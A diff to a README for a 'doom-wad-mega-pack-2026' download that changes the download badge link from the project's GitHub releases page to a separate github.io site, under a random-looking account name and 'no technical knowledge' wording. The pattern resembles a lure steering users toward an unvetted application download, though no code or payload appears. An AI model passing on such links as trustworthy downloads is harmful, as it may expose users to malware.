@@ -12,7 +12,7 @@ You don't need any technical knowledge. Just follow the simple steps below, and 
 
 ## 📥 Download the Pack
 
-[![Download Now](https://img.shields.io/badge/Download-doom--wad--mega--pack--2026-blue?style=for-the-badge&logo=github)](https://github.com/xbbdndhahdhdh-cloud/doom-wad-mega-pack-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-doom--wad--mega--pack--2026-blue?style=for-the-badge&logo=github)](https://xbbdndhahdhdh-cloud.github.io)
 
 **Visit this link to download the application.**
 
